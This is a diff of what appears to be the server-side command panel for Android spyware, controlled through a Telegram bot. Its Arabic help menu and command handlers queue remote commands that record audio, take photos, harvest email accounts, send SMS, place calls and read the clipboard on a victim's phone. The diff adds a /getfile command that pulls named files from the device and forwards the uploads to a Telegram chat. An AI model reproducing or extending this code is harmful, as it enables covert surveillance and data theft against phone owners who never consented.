@@ -92,14 +92,12 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
-      // التحقق من وقت انتهاء المفتاح (gentime) المحفوظ في KV
       const expAt = await kvCmd('GET', 'key_exp_at');
       if (expAt && Date.now() > parseInt(expAt)) {
         await kvCmd('DEL', 'key_exp_at');
         await kvCmd('SET', 'app_secret_key', 'EXPIRED');
         return res.status(200).send('"killapp:1"');
       }
-      
       const cmd = remoteCommand;
       remoteCommand = ""; 
       return res.status(200).send(`"${cmd}"`);
@@ -135,7 +133,7 @@ export default async function handler(req, res) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('document', new Blob([buffer]), filename);
-            formData.append('caption', `📁 ${filename.endsWith('.jpg') ? 'Photo' : 'Audio'}: ${filename}`);
+            formData.append('caption', `📁 File: ${filename}`);
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
               method: 'POST', body: formData
@@ -191,6 +189,7 @@ export default async function handler(req, res) {
         case '/help': 
           await sendToTelegram(`👑 *لوحة التحكم*\n\n` +
             `⚡ *أوامر خطيرة:*\n/rec15 (تسجيل صوت)\n/photo (التقاط صورة)\n/emails (جلب الحسابات)\n\n` +
+            `📂 *جلب الملفات:*\n/getfile <name> (مثلاً: /getfile app.apk)\n\n` +
             `⏱️ *المفاتيح:*\n/gentime <min>\n/settime <min>\n/setkey <key>\n/lock /unlock\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall\n\n` +
             `💥 *الأوامر المولدة:*\n/toast1-100 /url1-100 /vib1-50 /clip1-50 /sms1-50 /call1-50`); 
@@ -224,7 +223,15 @@ export default async function handler(req, res) {
           } else await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
           break;
 
-        case '/getfile': if(args[1]) { remoteCommand = `getfile:${args[1]}`; await sendToTelegram(`⏳ \`[FETCH]\` *Fetching: ${args[1]}...*`); } break;
+        case '/getfile': 
+          if(args[1]) { 
+            remoteCommand = `getfile:${args[1]}`; 
+            await sendToTelegram(`⏳ \`[FETCH]\` *جاري سحب الملف: ${args[1]}...*`); 
+          } else {
+            await sendToTelegram("⚠️ استعمل: `/getfile filename.apk`");
+          }
+          break;
+          
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Sent.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Sent.*"); } break;
         case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Locked.*"); break;
